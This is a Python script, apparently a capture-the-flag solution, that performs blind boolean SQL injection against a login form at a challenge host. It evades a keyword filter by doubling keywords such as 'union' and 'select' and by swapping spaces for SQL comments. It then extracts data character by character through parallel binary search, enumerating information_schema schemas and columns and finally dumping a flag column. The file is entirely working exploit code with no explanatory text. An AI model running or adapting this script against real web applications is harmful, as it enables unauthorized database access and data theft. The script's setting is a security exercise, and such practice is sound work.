import requests
import html
import re

from multiprocessing.pool import Pool
from time import time
def multi(func, init_list, processes = 8):
    err = None
    iterator = None
    try:
        pool = Pool(processes=processes)
        start = time()
        iterator = pool.imap(func, init_list)
        outputs = [x for x in iterator if x]
        end = time()
        print('used time: {}'.format(end-start))
    except Exception as e:
        err = e
    if err: raise err
    return outputs

url = 'http://h4ck3r.quest:10006/login'

waf = 'union|select|where|and|or'.split('|')
def bypass(query):
    for w in waf:
        h = len(w)//2
        query = query.replace(w, w[:h]+w+w[h:])
    query = query.replace(' ', '/**/')
    return query

def req(query):
    payload = f"\\' {query} #"
    payload = bypass(payload)
    r = requests.post(url, data={ 'username': payload, 'password': '' })
    r = html.unescape(r.text)
    if 1 and 'Mysql2::Error' in r:
        for l in r.split('\n'):
            if 'Mysql2::Error' in l:
                print(query, l)
    return r

def guess(query):
    # query = f"union select 1,2,3 where {query}"
    return 'Incorrect' not in req(query)

def get(args):
    p, idx = args
    l = 0
    r = 0xff
    while l < r:
        m = (l+r)//2
        if guess(p.format(idx,m)):
            l = m+1
        else:
            r = m
    return chr(l)

def query(args):
    column, table, where, idx = args
    p = f'union select 1,2,c from (select substr({column},{{}},1) as c from {table} {where} limit {idx},1) as T where ascii(c) > {{}}'
    size = 0
    while guess(p.format(size+1,0)):
        size += 1
    content = ''.join(multi(get, [(p,x+1) for x in range(size)]))
    return content

def blind(column, table, where = ''):
    size = 0
    res = []
    print(column, table, where)
    while guess(f"union select 1,2,{column} from {table} {where} limit {size},1"):
        val = query((column, table, where, size))
        print(size, val)
        res.append(val)
        size += 1
    return res

if __name__ == '__main__':
    blind('schema_name', 'information_schema.schemata')
    table_name = 'h3y_here_15_the_flag_y0u_w4nt,meow,flag'
    where = 'where table_name in (char({}))'.format(','.join(str(ord(c)) for c in table_name))
    blind('column_name', 'information_schema.columns', where)
    column_name = 'i_4m_th3_fl4g' 
    blind(column_name, f'`{table_name}`')
